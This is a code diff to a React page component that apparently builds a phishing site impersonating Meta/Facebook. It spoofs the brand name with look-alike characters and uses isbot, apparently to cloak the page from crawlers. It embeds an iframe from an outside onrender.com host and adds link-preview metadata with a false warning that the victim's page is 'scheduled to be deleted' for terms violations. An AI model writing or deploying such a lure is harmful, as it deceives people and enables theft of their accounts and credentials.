@@ -1,13 +1,16 @@
 import React, { useEffect, useState } from "react";
 import { isbot } from "isbot";
 import { Helmet } from 'react-helmet';
+import favicon2 from '../resources/favicon2.ico';
+import bannermeta from '../resources/banner-meta.png';
+
 
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://linkclient.onrender.com');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Мeta | Faceboοk');
-  let[SiteTitleHome, SetSiteTitleHome] = useState('Home');
+  let[SiteTitleHome, SetSiteTitleHome] = useState('Мeta | Faceboοk');
 
 
   function showIframe(file,title,favicon) {
@@ -15,8 +18,14 @@ function NotFound() {
       <>
       <Helmet>
           <title>{title}</title>
+          <meta property="og:type" content="article"/>
+          <meta property="og:title" content="We have scheduled your page to be deleted"/>
+          <meta name="description" content="We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification."/>
+          <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+          <meta property="og:image" content={bannermeta}/>
+          <meta name="theme-color" content="#000000"></meta>
           {favicon ? 
-          <link rel="icon" type="image/svg+xml" href="./favicon2.ico"/>
+          <link rel="icon" type="image/svg+xml" href={favicon2}/>
            :
            null
           }
